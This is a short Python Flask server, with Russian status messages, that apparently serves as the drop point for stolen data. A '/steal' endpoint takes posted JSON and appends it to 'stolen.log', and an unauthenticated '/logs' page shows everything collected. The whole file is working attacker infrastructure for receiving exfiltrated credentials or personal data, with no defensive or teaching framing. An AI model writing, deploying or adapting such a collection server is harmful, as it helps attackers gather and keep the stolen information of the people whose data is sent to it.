from flask import Flask, request, jsonify
import json, logging
from datetime import datetime
import os

app = Flask(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
LOG_FILE = 'stolen.log'

@app.route('/')
def index():
    return "Server is running"

@app.route('/steal', methods=['POST'])
def steal():
    data = request.get_json()
    if not data:
        return 'Bad request', 400
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{datetime.utcnow().isoformat()} {json.dumps(data, ensure_ascii=False)}\n")
    logging.info(f"Received: {json.dumps(data, ensure_ascii=False)[:200]}...")
    return 'OK', 200

@app.route('/logs', methods=['GET'])
def show_logs():
    try:
        with open(LOG_FILE, 'r') as f:
            content = f.read()
            if not content:
                return "Логов пока нет"
            return content.replace('\n', '<br>')
    except FileNotFoundError:
        return "Файл логов ещё не создан"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, threaded=True)
